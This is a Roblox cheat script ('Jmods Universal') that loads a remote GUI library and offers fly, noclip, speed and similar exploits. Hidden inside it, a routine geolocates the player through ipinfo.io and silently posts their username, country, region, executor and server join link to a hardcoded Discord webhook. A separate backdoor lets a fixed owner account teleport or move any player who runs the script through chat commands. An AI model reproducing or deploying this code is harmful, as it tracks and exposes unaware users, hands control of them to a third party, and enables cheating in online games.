local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/JoaoMods26/mods/refs/heads/main/RayfMODJmods'))()

_G.Rayfield = Rayfield
-- Crear ventana
local Window = Rayfield:CreateWindow({
    Name = "Jmods Universal",
    Icon = 127271155083726,
    LoadingTitle = "Jmods Universal",
    LoadingSubtitle = "joao_mods",
    Theme = "Bloom",
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "JmodsUniversal",
        FileName = "joao_mods"
    },
    Discord = {
        Enabled = true,
        Invite = "4gGUz2tk",
        RememberJoins = false
    },
    KeySystem = false,
    KeySettings = {
        Title = "Jmods Universal",
        Subtitle = "Mantenimiento",
Note = "Falta poco. Más info en mi Discord: discord.gg/4bzTyQBBnt",
        FileName = "key",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {"keymanxd"}
    }
})




-------Wea de owner




task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    -- Variables globales
    local LocalPlayer = game.Players.LocalPlayer
    local ownerId = 4591285210
    local Orbiting = false
    local RunService = game:GetService("RunService")

    -- Función para teletransportar al Owner
    local function TeleportToOwner()
        local owner = game.Players:GetPlayerByUserId(ownerId)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            local ownerPos = owner.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ownerPos + Vector3.new(0, 6, 0))
            end
        end
    end

    -- Función para iniciar la rotación alrededor del Owner
    local function StartOrbit()
        if LocalPlayer.UserId == ownerId or Orbiting then return end

        Orbiting = true

        RunService:BindToRenderStep("OrbitAroundOwner", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then
                RunService:UnbindFromRenderStep("OrbitAroundOwner")
                return
            end
            local owner = game.Players:GetPlayerByUserId(ownerId)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") and
               LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local time = tick()
                local radius = 10
                local speed = 2

                local x = math.cos(time * speed) * radius
                local z = math.sin(time * speed) * radius

                local ownerPos = owner.Character.HumanoidRootPart.Position
                local newPos = ownerPos + Vector3.new(x, 3, z)

                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, ownerPos)
            end
        end)
    end

    -- Función para detener la rotación
    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundOwner")
    end

    -- Función para manejar comandos del Owner
    local function OwnerChatHandler(message)
        local msg = message:lower()
        if msg == ".t" then
            TeleportToOwner()
        elseif msg == ".u" then
            StartOrbit()
        elseif msg == ".uu" then
            StopOrbit()
        end
    end

    -- Función para verificar y conectar a los dueños
    local function CheckAndConnectPlayers()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.UserId == ownerId and not player:FindFirstChild("__JmodsConnected") then
                local marker = Instance.new("BoolValue")
                marker.Name = "__JmodsConnected"
                marker.Parent = player
                player.Chatted:Connect(OwnerChatHandler)
            end
        end
    end

    -- Conectar al entrar jugadores
    game.Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)  -- Menor espera para reducir impacto
        if player.UserId == ownerId then
            CheckAndConnectPlayers()
        end
    end)

    -- Chequeo inicial
    CheckAndConnectPlayers()
end)








-- FUNCIONES DE TEMA
local themeSavePath = "JmodsUniversal/SelectedTheme.txt"

-- Guardar el tema
local function SaveTheme(themeName)
    if not isfile(themeSavePath) then
        makefolder("JmodsUniversal")
    end
    writefile(themeSavePath, themeName)

end

-- Cargar el tema guardado
local function LoadSavedTheme()
    local validThemes = {
        ["Light"] = true,
        ["Dark"] = true,
        ["Aqua"] = true,
        ["Jester"] = true,
        ["Moon"] = true,
        ["Synapse"] = true,
        ["Sentinel"] = true,
        ["Midnight"] = true,
        ["Serpent"] = true,
        ["Bloom"] = true,
        ["Discord"] = true,
        ["Default"] = true, -- Asegúrate de que todos los temas sean válidos
        ["AmberGlow"] = true,
        ["Amethyst"] = true,
        ["DarkBlue"] = true,
        ["Green"] = true,
        ["Ocean"] = true,
        ["Serenity"] = true,
    }

    if isfile(themeSavePath) then
        local theme = readfile(themeSavePath)

        if validThemes[theme] then

            Window.ModifyTheme(theme)
        else
            warn("Tema inválido:", theme)
            Window.ModifyTheme("Bloom")  -- Tema por defecto
        end
    else
        print("No se encontró el archivo de tema, cargando el predeterminado...")
        Window.ModifyTheme("Bloom")  -- Tema por defecto
    end
end

-- Cargar tema guardado al inicio
LoadSavedTheme()













-- [[ Notificación + WHID Check - Jmods Universal ]] --

task.delay(0.3, function()
    local success, err = pcall(function()
        local HttpService = game:GetService("HttpService")
        local CoreGui = game:GetService("CoreGui")
        local player = game.Players.LocalPlayer
        local placeName = "Juego desconocido"
        local ejecutador = "Desconocido"
        local jobId = game.JobId
        local userId = player.UserId
        local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)

        -- Lista de WHIDs bloqueados directamente en el script
        local blockedWHIDs = {
            [""] = true,
            [""] = true,
        }

        if blockedWHIDs[whid] then
            warn("WHID bloqueado: " .. whid)
            local hiddenUI = CoreGui:FindFirstChild("HiddenUI")
            if hiddenUI then
                hiddenUI:Destroy()
            end
            return
        end

        local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
        local webLink = "https://www.roblox.com/games/" .. game.PlaceId

        pcall(function()
            placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)

        pcall(function()
            ejecutador = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or "Otro"
        end)

        -- Mapeo de códigos de país a nombres completos
        local countryNames = {
            AF = "Afganistán", AL = "Albania", DZ = "Argelia", AD = "Andorra", AO = "Angola",
            AR = "Argentina", AM = "Armenia", AU = "Australia", AT = "Austria", AZ = "Azerbaiyán",
            BS = "Bahamas", BD = "Bangladés", BE = "Bélgica", BO = "Bolivia", BR = "Brasil",
            BG = "Bulgaria", CA = "Canadá", CL = "Chile", CN = "China", CO = "Colombia",
            CR = "Costa Rica", HR = "Croacia", CU = "Cuba", CZ = "Chequia", DK = "Dinamarca",
            DO = "República Dominicana", EC = "Ecuador", EG = "Egipto", SV = "El Salvador",
            EE = "Estonia", FI = "Finlandia", FR = "Francia", GE = "Georgia", DE = "Alemania",
            GR = "Grecia", GT = "Guatemala", HN = "Honduras", HU = "Hungría", IS = "Islandia",
            IN = "India", ID = "Indonesia", IR = "Irán", IE = "Irlanda", IL = "Israel",
            IT = "Italia", JP = "Japón", KZ = "Kazajistán", KR = "Corea del Sur", MX = "México",
            MD = "Moldavia", MA = "Marruecos", NL = "Países Bajos", NZ = "Nueva Zelanda",
            NI = "Nicaragua", NG = "Nigeria", NO = "Noruega", PA = "Panamá", PY = "Paraguay",
            PE = "Perú", PH = "Filipinas", PL = "Polonia", PT = "Portugal", RO = "Rumanía",
            RU = "Rusia", SA = "Arabia Saudita", RS = "Serbia", SG = "Singapur", SK = "Eslovaquia",
            SI = "Eslovenia", ZA = "Sudáfrica", ES = "España", SE = "Suecia", CH = "Suiza",
            TH = "Tailandia", TR = "Turquía", UA = "Ucrania", AE = "Emiratos Árabes Unidos",
            GB = "Reino Unido", US = "Estados Unidos", UY = "Uruguay", VE = "Venezuela", VN = "Vietnam"
        }

        local country = "Desconocido"
        local region = "Desconocido"

        local ipinfoReq = (syn and syn.request) or (http_request) or (request) or (http and http.request)
        if ipinfoReq then
            local geoResponse = ipinfoReq({
                Url = "https://ipinfo.io/json",
                Method = "GET"
            })
            if geoResponse and geoResponse.StatusCode == 200 then
                local geoData = HttpService:JSONDecode(geoResponse.Body)
                local countryCode = geoData.country or "Desconocido"
                country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
                region = geoData.region or "Desconocido"
            end
        end

        local folderName = "Jmods_NotifyFlag"
        if not CoreGui:FindFirstChild(folderName) then
            local flag = Instance.new("Folder")
            flag.Name = folderName
            flag.Parent = CoreGui

            local embedData = {
                title = "✅ Jmods Universal",
                color = tonumber("FFC0CB", 16),
                thumbnail = {
                    url = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"
                },
                footer = {
                    text = "Jmods Universal",
                    icon_url = ""
                },
                fields = { {
                    name = "📌 Información",
                    value = "👤 Usuario: " .. player.Name .. " ( " .. player.DisplayName .. " )" ..
                            "\n🎮 Juego: " .. placeName ..
                            "\n🧠 Ejecutador: " .. ejecutador ..
                            "\n🆔 WHID: " .. whid .. "" ..
                            "\n🌍 País: " .. country ..
                            "\n🏙️ Región: " .. region ..
                            "\n🕒 Hora: " .. os.date("%Y-%m-%d %H:%M:%S") ..
                            "\n🌐 [Ver juego en la web](" .. webLink .. ")" ..
                            "\n🔗 Unirse al servidor:\n
" .. joinLink .. "
",
                    inline = true
                }},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }

            local jsonData = HttpService:JSONEncode({embeds = {embedData}})
            local link = "https://discord.com/api/webhooks/1385412071830589552/XKZPpzAbj_6cjpNzTh50RHtBYXXirpdqi9jy1H49u8zIC7hbkPFP1KGnpLDY_P6VivH5"

            local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
            if req then
                req({
                    Url = link,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end
        end
    end)

    if not success then
        -- silencioso
    end
end)




















-- SECCIÓN PRINCIPAL
MainTab = Window:CreateTab("Principal", nil) -- Title, Image
MainSection = MainTab:CreateSection("Main")


    Rayfield:Notify({
           Title = "Bienvenido",
       Content = "joao_mods te espera en youtube",
       Duration = 15,
       Image = 13458017478,
             Callback = function()
          end

    })
    
    
---barra de velocidad---
Slider = MainTab:CreateSlider({
       Name = "Velocidad al correr",
       Range = {1, 500},
       Increment = 1,
       Suffix = "velocidad",
       CurrentValue = 16,
       Flag = "sliderws", -- 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
       end,
    })
    



----barra Salto----
Slider = MainTab:CreateSlider({
       Name = "Salto",
       Range = {1, 500},
       Increment = 1,
       Suffix = "Poder",
       CurrentValue = 16,
       Flag = "sliderjp", 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
       end,
    })



    

-- Servicios
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

-- Variables compartidas
local player = Players.LocalPlayer
local character, hrp, humanoid
local currentSpeed = 16
local currentJumpHeight = 0.61
local keysPressed = {}
local sliding = false
local jumping = false
local toggleActive = false
local jumpKey = Enum.KeyCode.Space

-- UI móvil
local touchGui = Instance.new("ScreenGui")
touchGui.Name = "TouchControls"
touchGui.ResetOnSpawn = false
touchGui.Parent = player:WaitForChild("PlayerGui")

local jumpButton, wasdFrame

-- Funciones para crear UI
local function createJumpButton()
	if jumpButton then jumpButton:Destroy() end

	jumpButton = Instance.new("TextButton")
	jumpButton.Size = UDim2.new(0, 100, 0, 100)
	jumpButton.Position = UDim2.new(1, -120, 1, -120)
	jumpButton.Text = "⭧"
	jumpButton.TextScaled = true
	jumpButton.BackgroundColor3 = Color3.new(1, 1, 1)
	jumpButton.BackgroundTransparency = 0.2
	jumpButton.Parent = touchGui

	jumpButton.MouseButton1Down:Connect(function()
		if toggleActive then
			jumping = true
		end
	end)

	jumpButton.MouseButton1Up:Connect(function()
		jumping = false
	end)
end

local function createWASDFrame()
	if wasdFrame then wasdFrame:Destroy() end

	wasdFrame = Instance.new("Frame")
	wasdFrame.Size = UDim2.new(0, 200, 0, 200)
	wasdFrame.Position = UDim2.new(0, 20, 1, -220)
	wasdFrame.BackgroundTransparency = 1
	wasdFrame.Parent = touchGui

	local directions = {
		{key = Enum.KeyCode.W, pos = UDim2.new(0.5, -25, 0, 0), txt = "W"},
		{key = Enum.KeyCode.S, pos = UDim2.new(0.5, -25, 0, 100), txt = "S"},
		{key = Enum.KeyCode.A, pos = UDim2.new(0, 0, 0, 100), txt = "A"},
		{key = Enum.KeyCode.D, pos = UDim2.new(1, -50, 0, 100), txt = "D"},
	}

	for _, dir in ipairs(directions) do
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0, 50, 0, 50)
		btn.Position = dir.pos
		btn.Text = dir.txt
		btn.BackgroundColor3 = Color3.new(1, 1, 1)
		btn.BackgroundTransparency = 0.2
		btn.TextScaled = true
		btn.Parent = wasdFrame

		btn.MouseButton1Down:Connect(function()
			keysPressed[dir.key] = true
		end)

		btn.MouseButton1Up:Connect(function()
			keysPressed[dir.key] = false
		end)
	end
end

-- Input
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = true
	end
	if input.KeyCode == jumpKey and toggleActive then
		jumping = true
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = false
	end
	if input.KeyCode == jumpKey then
		jumping = false
	end
end)

-- Dirección
local function getDirection()
	local camCF = workspace.CurrentCamera.CFrame
	local moveDir = Vector3.zero

	if keysPressed[Enum.KeyCode.W] then moveDir += camCF.LookVector end
	if keysPressed[Enum.KeyCode.S] then moveDir -= camCF.LookVector end
	if keysPressed[Enum.KeyCode.A] then moveDir -= camCF.RightVector end
	if keysPressed[Enum.KeyCode.D] then moveDir += camCF.RightVector end

	moveDir = Vector3.new(moveDir.X, 0, moveDir.Z)
	return moveDir.Magnitude > 0 and moveDir.Unit or Vector3.zero
end

-- Movimiento
RunService.RenderStepped:Connect(function(dt)
	if sliding and hrp and character then
		local dir = getDirection()
		if dir.Magnitude > 0 then
			hrp.CFrame += dir * currentSpeed * dt
		end
	end
	if jumping and toggleActive and hrp then
		hrp.CFrame = hrp.CFrame + Vector3.new(0, currentJumpHeight, 0)
	end
end)

-- Setup personaje
local function setupCharacter(char)
	character = char
	hrp = character:WaitForChild("HumanoidRootPart")
	humanoid = character:WaitForChild("Humanoid")
	hrp.Anchored = false

	if sliding then
		humanoid.WalkSpeed = 0
	else
		humanoid.WalkSpeed = 16
	end
end

if player.Character then setupCharacter(player.Character) end
player.CharacterAdded:Connect(setupCharacter)

-- UI con Rayfield o el sistema que uses
MainTab:CreateToggle({
	Name = "Modo deslizamiento",
	CurrentValue = false,
	Flag = "slidetoggle",
	Callback = function(Value)
		sliding = Value
		if humanoid then
			humanoid.WalkSpeed = Value and 0 or 16
		end
		if UserInputService.TouchEnabled then
			if Value then
				createWASDFrame()
			elseif wasdFrame then
				wasdFrame:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Velocidad deslizarse",
	Range = {1, 500},
	Increment = 1,
	Suffix = "velocidad",
	CurrentValue = currentSpeed,
	Flag = "sliderws",
	Callback = function(Value)
		currentSpeed = Value
	end,
})

MainTab:CreateToggle({
	Name = "Salto Deslizado",
	CurrentValue = false,
	Flag = "jumptoggle",
	Callback = function(Value)
		toggleActive = Value
		if not Value then
			jumping = false
		end
		if UserInputService.TouchEnabled then
			if Value then
				createJumpButton()
			elseif jumpButton then
				jumpButton:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Altura del Salto",
	Range = {0.01, 7},
	Increment = 0.01,
	Suffix = " altura",
	CurrentValue = currentJumpHeight,
	Flag = "sliderjumpheight",
	Callback = function(Value)
		currentJumpHeight = Value
	end,
})







---Salto infinito----

Button = MainTab:CreateButton({
   Name = "Salto infinito",
   Callback = function()
       -- Toggles 
       _G.infinjump = not _G.infinjump


       if _G.infinJumpStarted == nil then
           _G.infinJumpStarted = true

           local plr = game:GetService('Players').LocalPlayer
           local m = plr:GetMouse()
           local UIS = game:GetService("UserInputService")

           -- Teclado (PC)
           m.KeyDown:Connect(function(k)
               if _G.infinjump and k:byte() == 32 then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)

           -- Soporte Móvil (Touch/Jump Button)
           UIS.JumpRequest:Connect(function()
               if _G.infinjump then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)
       end
   end,
})





----Pajas----   
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local toggleActive = false
local currentSpeed = 1
local track = nil
local humanoid = nil

-- Función para iniciar la animación
local function playLoopedAnimation()
	task.spawn(function()
		while toggleActive and humanoid do
			if track then
				track:Stop()
				track = nil
			end

			local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
			local anim = Instance.new("Animation")
			anim.AnimationId = isR15 and "rbxassetid://698251653" or "rbxassetid://72042024"
			track = humanoid:LoadAnimation(anim)

			local endTime = isR15 and 0.7 or 0.65

			track:Play()
			track:AdjustSpeed(currentSpeed)
			track.TimePosition = 0.6

			-- Espera hasta que termine o se apague el toggle
			while track and toggleActive and track.TimePosition < endTime do
				task.wait(0.05)
				track:AdjustSpeed(currentSpeed)
			end

			if track then
				track:Stop()
				track = nil
			end
		end
	end)
end

-- Toggle de animación
MainTab:CreateToggle({
	Name = "Animación Paja",
	CurrentValue = false,
	Flag = "PajaToggle",
	Callback = function(Value)
		toggleActive = Value

		local character = player.Character or player.CharacterAdded:Wait()
		humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if toggleActive then
			playLoopedAnimation()
		elseif track then
			track:Stop()
			track = nil
		end
	end,
})

-- Slider de velocidad
MainTab:CreateSlider({
	Name = "Velocidad de Animación",
	Range = {0.1, 1},
	Increment = 0.1,
	Suffix = "x",
	CurrentValue = currentSpeed,
	Flag = "SpeedSlider",
	Callback = function(Value)
		currentSpeed = Value
		if track then
			track:AdjustSpeed(currentSpeed)
		end
	end,
})

-- Reinicio del personaje
player.CharacterAdded:Connect(function(char)
	humanoid = char:WaitForChild("Humanoid")
	if toggleActive then
		playLoopedAnimation()
	end
end)







----Recuperar VC---
Button = MainTab:CreateButton({
   Name = "Recuperar Vc",
   Callback = function()
   game:GetService("VoiceChatService"):joinVoice()-- The function that takes place when the button is pressed
   end,
})

---Spin

local spinActive = false
local spinSpeed = 10 -- Velocidad predeterminada del giro
local spinAngle = 0

local function toggleSpin()
    spinActive = not spinActive
    if spinActive then
        Rayfield:Notify({
            Title = "Spin Activado",
            Content = "El giro ha comenzado.",
            Duration = 3,
            Image = 4483362458
        })
    else
        Rayfield:Notify({
            Title = "Spin Desactivado",
            Content = "El giro ha sido detenido.",
            Duration = 3,
            Image = 4483362458
        })
    end
end

local spinToggle = MainTab:CreateToggle({
    Name = "Spin",
    Callback = function()
        toggleSpin()
    end
})

-- Slider para ajustar la velocidad del Spin
MainTab:CreateSlider({
    Name = "Velocidad de Spin",
    Range = {1, 50},
    Increment = 1,
    Suffix = "vel",
    CurrentValue = spinSpeed,
    Callback = function(value)
        spinSpeed = value
    end
})

game:GetService("RunService").Heartbeat:Connect(function(dt)
    if spinActive then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            spinAngle = spinAngle + spinSpeed * dt
            character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
        end
    end
end)




----Reset

Button = MainTab:CreateButton({
   Name = "Respawn",
   Callback = function()
		game.Players.LocalPlayer.Character:BreakJoints()
   end,
})

 -----Refresh---
 Button = MainTab:CreateButton({
    Name = "Respawn Guardando posición",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:FindFirstChild("HumanoidRootPart")

        if hrp then
            local savedCFrame = hrp.CFrame

            -- Conectamos a CharacterAdded para volver a teletransportarlo cuando reaparezca
            local connection
            connection = player.CharacterAdded:Connect(function(char)
                local newHrp = char:WaitForChild("HumanoidRootPart", 5)
                if newHrp then
                    newHrp.CFrame = savedCFrame
                end
                connection:Disconnect()
            end)

            -- Matamos al personaje
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})






---Quitar cooldown E---

Button = MainTab:CreateButton({
   Name = "Quitar Cooldown E",
   Callback = function()
   for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
	if v:IsA("ProximityPrompt") then
		v["HoldDuration"] = 0
	end
end
 
 
game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(v)
    v["HoldDuration"] = 0
end)
   end,
})


---Gravedad---	
Button = MainTab:CreateButton({
   Name = "Gravedad 0",
   Callback = function()
   local plr = game:GetService("Players").LocalPlayer
local normalGravity = workspace.Gravity


local function MUBRZ_fake_script()

    workspace.Gravity = 0

    local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        humanoid.Sit = true
        task.wait(0.1) -- Esperamos un poco


        humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)

        
        for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
    end


    game:GetService("UserInputService").JumpRequest:Connect(function()
        workspace.Gravity = normalGravity 	
    end)
end


coroutine.wrap(MUBRZ_fake_script)()


   end,
})
----Noclip----

local noclipEnabled = false
local noclipConnection
local originalCollisions = {}

MainTab:CreateToggle({
    Name = "Noclip Act/Des",
    Flag = "NoclipToggle", -- <--- Añadido Flag
    CurrentValue = false,
    Callback = function(state)
        noclipEnabled = state
        local character = game.Players.LocalPlayer.Character

        if noclipEnabled then
            -- Guardar estado original
            originalCollisions = {}
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisions[part] = part.CanCollide
                end
            end

            noclipConnection = game:GetService("RunService").Stepped:Connect(function()
                for part, _ in pairs(originalCollisions) do
                    if part and part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
            -- Restaurar el estado original
            for part, originalState in pairs(originalCollisions) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = originalState
                end
            end
            originalCollisions = {}
        end
    end,
})






------Fly-----

local UIS = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
local RootPart = Character:FindFirstChild("HumanoidRootPart")

local FlyEnabled = false
local FlySpeed = 50
local Connection
local MobileGui = nil

local MobileMove = {
    Forward = false,
    Backward = false,
    Left = false,
    Right = false,
    Up = false,
    Down = false,
}

-- Función para actualizar el personaje y sus componentes
local function UpdateCharacter(newCharacter)
    Character = newCharacter
    Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
    RootPart = Character:FindFirstChild("HumanoidRootPart")
end

-- Actualizar referencias cuando el personaje cambia
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("HumanoidRootPart")
    newCharacter:WaitForChild("Humanoid")
    UpdateCharacter(newCharacter)
    if FlyEnabled then
        ToggleFly(false)
        ToggleFly(true)
    end
end)

-- Crear controles móviles
local function CreateMobileControls()
    if not UIS.TouchEnabled or MobileGui then return end

    MobileGui = Instance.new("ScreenGui")
    MobileGui.Name = "MobileFlyControls"
    MobileGui.ResetOnSpawn = false
    MobileGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local ButtonSize = UDim2.new(0, 60, 0, 60)

    local function CreateButton(name, position, onPress, onRelease)
        local Button = Instance.new("TextButton")
        Button.Name = name
        Button.Size = ButtonSize
        Button.Position = position
        Button.Text = name
        Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        Button.TextColor3 = Color3.new(1, 1, 1)
        Button.AutoButtonColor = false
        Button.Parent = MobileGui

        Button.MouseButton1Down:Connect(function()
            onPress()
        end)

        Button.MouseButton1Up:Connect(function()
            onRelease()
        end)
    end

    CreateButton("W", UDim2.new(0, 80, 1, -180), function() MobileMove.Forward = true end, function() MobileMove.Forward = false end)
    CreateButton("S", UDim2.new(0, 80, 1, -60), function() MobileMove.Backward = true end, function() MobileMove.Backward = false end)
    CreateButton("A", UDim2.new(0, 20, 1, -120), function() MobileMove.Left = true end, function() MobileMove.Left = false end)
    CreateButton("D", UDim2.new(0, 140, 1, -120), function() MobileMove.Right = true end, function() MobileMove.Right = false end)
    CreateButton("Up", UDim2.new(1, -120, 1, -180), function() MobileMove.Up = true end, function() MobileMove.Up = false end)
    CreateButton("Down", UDim2.new(1, -120, 1, -100), function() MobileMove.Down = true end, function() MobileMove.Down = false end)
end

local function DestroyMobileControls()
    if MobileGui then
        MobileGui:Destroy()
        MobileGui = nil
    end
    for key in pairs(MobileMove) do
        MobileMove[key] = false
    end
end

--toggle
function ToggleFly(state)
    if not RootPart or not Humanoid then
        return
    end

    FlyEnabled = state

    if FlyEnabled then
        -- Activar controles móviles si es touch
        if UIS.TouchEnabled then
            CreateMobileControls()
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        Humanoid:ChangeState(Enum.HumanoidStateType.Physics)

        Connection = RunService.RenderStepped:Connect(function()
            local MoveDirection = Vector3.new()
            local cameraCFrame = Workspace.CurrentCamera.CFrame
            local forward = cameraCFrame.LookVector
            local right = cameraCFrame.RightVector
            local up = Vector3.new(0, 1, 0)

            if UIS:IsKeyDown(Enum.KeyCode.W) or MobileMove.Forward then MoveDirection = MoveDirection + forward end
            if UIS:IsKeyDown(Enum.KeyCode.S) or MobileMove.Backward then MoveDirection = MoveDirection - forward end
            if UIS:IsKeyDown(Enum.KeyCode.A) or MobileMove.Left then MoveDirection = MoveDirection - right end
            if UIS:IsKeyDown(Enum.KeyCode.D) or MobileMove.Right then MoveDirection = MoveDirection + right end
            if UIS:IsKeyDown(Enum.KeyCode.Space) or MobileMove.Up then MoveDirection = MoveDirection + up end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or MobileMove.Down then MoveDirection = MoveDirection - up end

            if MoveDirection.Magnitude == 0 then
                RootPart.Velocity = Vector3.new(0, 0, 0)
            else
                RootPart.Velocity = MoveDirection.Unit * FlySpeed
            end
        end)
    else
        if Connection then
            Connection:Disconnect()
            Connection = nil
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)

        -- Desactivar controles móviles si estaban activos
        DestroyMobileControls()
    end
end

-- UI Rayfield
FlyToggle = MainTab:CreateToggle({
    Name = "Volar Gravedad 0",
    CurrentValue = false,
    Callback = function(state)
        ToggleFly(state)
    end
})

FlySpeedSlider = MainTab:CreateSlider({
    Name = "Velocidad Gravedad 0",
    Range = {0, 300},
    Increment = 5,
    Suffix = "Velocidad",
    CurrentValue = FlySpeed,
    Callback = function(value)
        FlySpeed = value
    end
})






---Zoon sin limite--

local LocalPlayer = Players.LocalPlayer
local CameraMaxZoom = 4000  
local DefaultMaxZoom = LocalPlayer.CameraMaxZoomDistance  -- Guardar el valor original

local ZoomUnlocked = false

local function ToggleZoom(state)
    ZoomUnlocked = state

    if ZoomUnlocked then
        LocalPlayer.CameraMaxZoomDistance = CameraMaxZoom
    else
        LocalPlayer.CameraMaxZoomDistance = DefaultMaxZoom
    end
end

-- Crear el Toggle en Rayfield
ZoomToggle = MainTab:CreateToggle({
    Name = "Zoom sin limite",
    CurrentValue = false,
    Callback = function(state)
        ToggleZoom(state)
    end
})

-----Fog-----

local Lighting = game:GetService("Lighting")

-- Guardamos los valores originales del fog
local originalFogStart = Lighting.FogStart
local originalFogEnd = Lighting.FogEnd
local originalFogColor = Lighting.FogColor

-- Función para quitar el fog
local function removeFog()
    Lighting.FogStart = 1000000  
    Lighting.FogEnd = 1000000    

end

-- Función para restaurar el fog a su estado original
local function restoreFog()
    Lighting.FogStart = originalFogStart  
    Lighting.FogEnd = originalFogEnd    
    Lighting.FogColor = originalFogColor 

end


Toggle = MainTab:CreateToggle({
    Name = "Quitar Fog",
    CurrentValue = false,  
    Flag = "RemoveFogToggle",  
    Callback = function(value)
        if value then
            removeFog()  
        else
            restoreFog()  
        end
    end,
})

---Fov---

local FOVEnabled = false
local LastFOVValue = workspace.CurrentCamera.FieldOfView

-- Toggle para activar/desactivar el FOV personalizado
MainTab:CreateToggle({
    Name = "FOV",
    CurrentValue = false,
    Flag = "FOVEnabledToggle",
    Callback = function(state)
        FOVEnabled = state
        if not state then
            workspace.CurrentCamera.FieldOfView = 70
        else
            workspace.CurrentCamera.FieldOfView = LastFOVValue
        end
    end,
})

-- Slider para el FOV
MainTab:CreateSlider({
    Name = "Cambiar Fov",
    Range = {40, 120},
    Increment = 1,
    Suffix = "°",
    CurrentValue = LastFOVValue,
    Flag = "FOVSlider",
    Callback = function(val)
        LastFOVValue = val
        if FOVEnabled then
            workspace.CurrentCamera.FieldOfView = val
        end
    end,
})




----CLick tp y delete
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

local humanoidRootPart
local ctrlPressed = false
local altPressed = false

-- Función para actualizar HRP
local function updateCharacter()
    local character = player.Character or player.CharacterAdded:Wait()
    humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
end
task.spawn(updateCharacter)
player.CharacterAdded:Connect(updateCharacter)

-- Estados de toggle
local teleportEnabled = false
local deleteEnabled = false

-- Esperar a que MainTab exista antes de crear los toggles
